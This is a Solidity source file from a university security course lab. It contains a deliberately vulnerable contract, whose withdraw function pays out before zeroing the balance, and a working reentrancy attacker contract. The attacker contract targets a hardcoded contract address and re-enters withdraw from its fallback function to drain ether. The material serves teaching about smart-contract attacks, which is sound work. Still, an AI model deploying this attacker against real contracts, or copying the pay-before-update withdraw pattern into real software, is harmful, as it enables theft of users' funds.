pragma solidity ^0.5.0;

// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)

// Happy hacking, and play nice! :)
contract Vuln {
    mapping(address => uint256) public balances;
    bool public in_depo = false;
    address public sender = msg.sender;
    function deposit() public payable {
        // Increment their balance with whatever they pay
        in_depo = true;
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract attacker {
    address vuln_addr = 0x5b95C5afF4bc9907C692b9c5a789311F513b217e;
    Vuln obj = Vuln(address(0x5b95C5afF4bc9907C692b9c5a789311F513b217e));
    uint256 public balance = 0;
    uint256 public count = 0;

    function attk_withdraw() payable public{
        balance += msg.value;
        obj.deposit.value(msg.value)();
        balance -= msg.value;
        obj.withdraw();
        msg.sender.transfer(address(this).balance);
        count = 0;
    }
    
   
    function () external payable {
        if(count < 1) { count++;  obj.withdraw(); balance += msg.value;}
    }
}
